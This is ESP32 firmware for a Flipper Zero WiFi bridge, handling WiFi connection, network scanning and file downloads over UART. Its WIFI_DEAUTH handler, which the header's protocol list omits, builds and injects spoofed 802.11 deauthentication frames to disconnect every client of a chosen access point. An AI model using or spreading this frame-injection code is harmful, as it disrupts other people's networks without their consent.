/*
 * Flipped App Store - ESP32 WiFi Bridge Firmware
 *
 * Flash this to an ESP32/ESP32-S2 WiFi dev board connected to the
 * Flipper Zero via UART (GPIO pins).
 *
 * Wiring:
 *   ESP32 TX -> Flipper RX (pin 14 / PA7)
 *   ESP32 RX -> Flipper TX (pin 13 / PA6)
 *   ESP32 GND -> Flipper GND
 *   ESP32 3V3 -> Flipper 3V3 (or power via USB)
 *
 * UART Protocol:
 *   AT\r\n                -> OK\r\n
 *   WIFI_STATUS\r\n       -> CONNECTED\r\n | DISCONNECTED\r\n
 *   WIFI_SSID <ssid>\r\n  -> OK\r\n | ERROR:<msg>\r\n
 *   WIFI_PASS <pass>\r\n  -> OK\r\n
 *   WIFI_CONNECT\r\n      -> CONNECTED\r\n | ERROR:<msg>\r\n
 *   DOWNLOAD <url>\r\n    -> SIZE:<bytes>\r\n<raw data>\r\nDONE\r\n
 *                         -> ERROR:<msg>\r\n
 */

#include <WiFi.h>
#include <HTTPClient.h>
#include <esp_wifi.h>

// UART to Flipper Zero
#define FLIPPER_SERIAL Serial1
#define FLIPPER_BAUD 115200
#define FLIPPER_RX_PIN 16  // Adjust for your board
#define FLIPPER_TX_PIN 17  // Adjust for your board

// WiFi credentials (can be set via UART commands or hardcoded)
static String wifi_ssid = "";
static String wifi_pass = "";

// Max download size (1MB)
#define MAX_DOWNLOAD_SIZE (1024 * 1024)

void setup() {
    Serial.begin(115200);
    Serial.println("Flipped WiFi Bridge starting...");

    FLIPPER_SERIAL.begin(FLIPPER_BAUD, SERIAL_8N1, FLIPPER_RX_PIN, FLIPPER_TX_PIN);

    // Try to load saved WiFi credentials from preferences
    // or connect to previously saved network
    WiFi.mode(WIFI_STA);
    WiFi.setAutoReconnect(true);

    // If credentials were saved previously, WiFi.begin() will use them
    if (wifi_ssid.length() > 0) {
        WiFi.begin(wifi_ssid.c_str(), wifi_pass.c_str());
        Serial.printf("Connecting to %s...\n", wifi_ssid.c_str());

        unsigned long start = millis();
        while (WiFi.status() != WL_CONNECTED && millis() - start < 10000) {
            delay(250);
        }

        if (WiFi.status() == WL_CONNECTED) {
            Serial.printf("Connected! IP: %s\n", WiFi.localIP().toString().c_str());
        } else {
            Serial.println("WiFi connection failed");
        }
    }

    Serial.println("Ready for commands");
}

void send_response(const char* response) {
    FLIPPER_SERIAL.print(response);
    FLIPPER_SERIAL.print("\r\n");
    FLIPPER_SERIAL.flush();
}

void handle_download(const char* url) {
    if (WiFi.status() != WL_CONNECTED) {
        send_response("ERROR:Not connected to WiFi");
        return;
    }

    Serial.printf("Downloading: %s\n", url);

    HTTPClient http;
    http.begin(url);
    http.setFollowRedirects(HTTPC_STRICT_FOLLOW_REDIRECTS);
    http.setTimeout(15000);

    int httpCode = http.GET();

    if (httpCode != HTTP_CODE_OK) {
        char err[64];
        snprintf(err, sizeof(err), "ERROR:HTTP %d", httpCode);
        send_response(err);
        http.end();
        return;
    }

    int contentLength = http.getSize();
    if (contentLength <= 0) {
        send_response("ERROR:Unknown content length");
        http.end();
        return;
    }

    if (contentLength > MAX_DOWNLOAD_SIZE) {
        send_response("ERROR:File too large");
        http.end();
        return;
    }

    // Send size header
    char header[32];
    snprintf(header, sizeof(header), "SIZE:%d", contentLength);
    send_response(header);

    // Small delay to let Flipper process the header
    delay(50);

    // Stream file data to Flipper
    WiFiClient* stream = http.getStreamPtr();
    uint8_t buf[512];
    int remaining = contentLength;

    while (remaining > 0 && stream->connected()) {
        int toRead = remaining > (int)sizeof(buf) ? (int)sizeof(buf) : remaining;
        int bytesRead = stream->readBytes(buf, toRead);

        if (bytesRead <= 0) {
            break;
        }

        FLIPPER_SERIAL.write(buf, bytesRead);
        FLIPPER_SERIAL.flush();
        remaining -= bytesRead;

        // Small yield to prevent watchdog
        yield();
    }

    http.end();

    // Send completion marker
    delay(10);
    send_response("\r\nDONE");

    Serial.printf("Download complete, sent %d bytes\n", contentLength - remaining);
}

void handle_command(String& cmd) {
    cmd.trim();
    if (cmd.length() == 0) return;

    Serial.printf("CMD: %s\n", cmd.c_str());

    if (cmd == "AT") {
        send_response("OK");
    } else if (cmd == "WIFI_STATUS") {
        if (WiFi.status() == WL_CONNECTED) {
            send_response("CONNECTED");
        } else {
            send_response("DISCONNECTED");
        }
    } else if (cmd.startsWith("WIFI_SSID ")) {
        wifi_ssid = cmd.substring(10);
        send_response("OK");
    } else if (cmd.startsWith("WIFI_PASS ")) {
        wifi_pass = cmd.substring(10);
        send_response("OK");
    } else if (cmd == "WIFI_CONNECT") {
        if (wifi_ssid.length() == 0) {
            send_response("ERROR:No SSID set");
            return;
        }

        WiFi.disconnect();
        delay(100);
        WiFi.begin(wifi_ssid.c_str(), wifi_pass.c_str());

        unsigned long start = millis();
        while (WiFi.status() != WL_CONNECTED && millis() - start < 15000) {
            delay(250);
        }

        if (WiFi.status() == WL_CONNECTED) {
            Serial.printf("Connected! IP: %s\n", WiFi.localIP().toString().c_str());
            send_response("CONNECTED");
        } else {
            send_response("ERROR:Connection failed");
        }
    } else if (cmd == "WIFI_DISCONNECT") {
        WiFi.disconnect();
        delay(100);
        send_response("OK");
    } else if (cmd == "WIFI_SCAN") {
        Serial.println("Scanning WiFi networks...");
        int n = WiFi.scanNetworks();
        if (n < 0) {
            send_response("ERROR:Scan failed");
            return;
        }

        for (int i = 0; i < n; i++) {
            char line[128];
            snprintf(line, sizeof(line), "%ddBm|CH%d|%s|%s",
                WiFi.RSSI(i),
                WiFi.channel(i),
                (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) ? "OPEN" : "LOCKED",
                WiFi.SSID(i).c_str());
            send_response(line);
        }

        WiFi.scanDelete();
        send_response("DONE");
    } else if (cmd.startsWith("WIFI_DEAUTH ")) {
        // Deauth requires raw 802.11 frame injection
        // Parse: WIFI_DEAUTH <bssid> [count]
        String args = cmd.substring(12);
        args.trim();

        int spaceIdx = args.indexOf(' ');
        String bssidStr;
        int count = 50;

        if (spaceIdx > 0) {
            bssidStr = args.substring(0, spaceIdx);
            count = args.substring(spaceIdx + 1).toInt();
            if (count <= 0) count = 50;
            if (count > 500) count = 500;
        } else {
            bssidStr = args;
        }

        // Parse MAC address
        uint8_t bssid[6];
        int parsed = sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
            &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);

        if (parsed != 6) {
            send_response("ERROR:Invalid BSSID format (XX:XX:XX:XX:XX:XX)");
            return;
        }

        // Deauth frame template (IEEE 802.11)
        uint8_t deauth_frame[26] = {
            0xC0, 0x00,                         // Frame Control: Deauthentication
            0x00, 0x00,                         // Duration
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: target BSSID
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: target
            0x00, 0x00,                         // Sequence number
            0x07, 0x00                          // Reason: Class 3 frame from nonassociated STA
        };

        // Set source and BSSID to target AP
        memcpy(deauth_frame + 10, bssid, 6);
        memcpy(deauth_frame + 16, bssid, 6);

        // Need to be in promiscuous mode for raw frame injection
        esp_wifi_set_mode(WIFI_MODE_STA);
        esp_wifi_start();
        esp_wifi_set_promiscuous(true);

        int sent = 0;
        for (int i = 0; i < count; i++) {
            deauth_frame[22] = (i & 0xFF);
            deauth_frame[23] = ((i >> 8) & 0x0F);
            if (esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false) == ESP_OK) {
                sent++;
            }
            delay(2);
        }

        esp_wifi_set_promiscuous(false);

        char result[64];
        snprintf(result, sizeof(result), "Sent %d/%d deauth frames", sent, count);
        send_response(result);
    } else if (cmd.startsWith("DOWNLOAD ")) {
        String url = cmd.substring(9);
        url.trim();
        handle_download(url.c_str());
    } else {
        send_response("ERROR:Unknown command");
    }
}

void loop() {
    static String inputBuffer = "";

    while (FLIPPER_SERIAL.available()) {
        char c = FLIPPER_SERIAL.read();

        if (c == '\n') {
            handle_command(inputBuffer);
            inputBuffer = "";
        } else if (c != '\r') {
            if (inputBuffer.length() < 1024) {
                inputBuffer += c;
            }
        }
    }

    delay(1);
}
